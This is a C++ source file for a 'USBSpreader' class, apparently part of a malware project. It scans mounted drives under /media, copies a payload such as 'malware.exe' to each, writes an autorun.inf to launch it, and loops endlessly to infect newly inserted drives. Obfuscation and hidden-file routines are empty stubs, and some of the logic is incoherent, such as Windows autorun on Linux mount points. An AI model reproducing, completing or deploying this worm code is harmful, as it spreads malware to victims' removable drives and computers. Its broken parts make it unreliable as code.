#include "USBSpreader.h"
#include "Logger.h"
#include "Config.h"
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <filesystem>
#include <algorithm>
#include <stdexcept>

namespace fs = std::filesystem;

USBSpreader::USBSpreader() {}

void USBSpreader::configure(const std::string &configFilePath) {
    this->configFilePath = configFilePath;
    if (!Config::load(configFilePath)) {
        handleErrors("Failed to load config file");
    }
}

void USBSpreader::spread(const std::string &payloadPath) {
    auto usbDevices = getConnectedUSBDevices();
    for (const auto &usbDevice : usbDevices) {
        copyPayloadToUSB(usbDevice, payloadPath);
        autoRunSetup(usbDevice, payloadPath);
        setupHiddenFiles(usbDevice, payloadPath);
        logActivity("Payload copied to " + usbDevice);
    }
    monitorUSBConnections();
}

std::vector<std::string> USBSpreader::getConnectedUSBDevices() {
    std::vector<std::string> devices;
    for (const auto &entry : fs::directory_iterator("/media")) {
        if (fs::is_directory(entry.path())) {
            devices.push_back(entry.path().string());
        }
    }
    return devices;
}

void USBSpreader::copyPayloadToUSB(const std::string &usbDevice, const std::string &payloadPath) {
    try {
        std::string obfuscatedPayload = payloadPath; // Modify this as per obfuscation method
        obfuscatePayload(obfuscatedPayload);
        fs::copy(obfuscatedPayload, usbDevice, fs::copy_options::overwrite_existing);
    } catch (const std::exception &e) {
        handleErrors("Failed to copy payload to USB: " + std::string(e.what()));
    }
}

void USBSpreader::autoRunSetup(const std::string &usbDevice, const std::string &payloadPath) {
    try {
        std::ofstream autorunFile(usbDevice + "/autorun.inf");
        autorunFile << "[autorun]\n";
        autorunFile << "open=" << payloadPath << "\n";
        autorunFile << "action=Run malware\n";
        autorunFile.close();
    } catch (const std::exception &e) {
        handleErrors("Failed to set up autorun: " + std::string(e.what()));
    }
}

void USBSpreader::obfuscatePayload(const std::string &payloadPath) {
    // Implement payload obfuscation logic here
}

void USBSpreader::monitorUSBConnections() {
    while (true) {
        try {
            auto newDevices = getConnectedUSBDevices();
            for (const auto &device : newDevices) {
                if (std::find(usbDevices.begin(), usbDevices.end(), device) == usbDevices.end()) {
                    copyPayloadToUSB(device, Config::get("payload_path", "malware.exe"));
                    autoRunSetup(device, Config::get("payload_path", "malware.exe"));
                    setupHiddenFiles(device, Config::get("payload_path", "malware.exe"));
                    logActivity("New USB device found and payload copied to " + device);
                }
            }
            usbDevices = newDevices;
            std::this_thread::sleep_for(std::chrono::seconds(5));
        } catch (const std::exception &e) {
            handleErrors("Error during USB monitoring: " + std::string(e.what()));
        }
    }
}

void USBSpreader::setupHiddenFiles(const std::string &usbDevice, const std::string &payloadPath) {
    // Implementation for setting up hidden files or folders
}

void USBSpreader::logActivity(const std::string &activity) {
    Logger::log(Logger::INFO, activity);
}

void USBSpreader::handleErrors(const std::string &error) {
    Logger::log(Logger::ERROR, error);
    throw std::runtime_error(error);
}

void USBSpreader::cacheResults(const std::string &device, const std::string &result) {
    cachedResults[device] = result;
}

void USBSpreader::recoverFromErrors() {
    // Implementation for recovering from errors
}

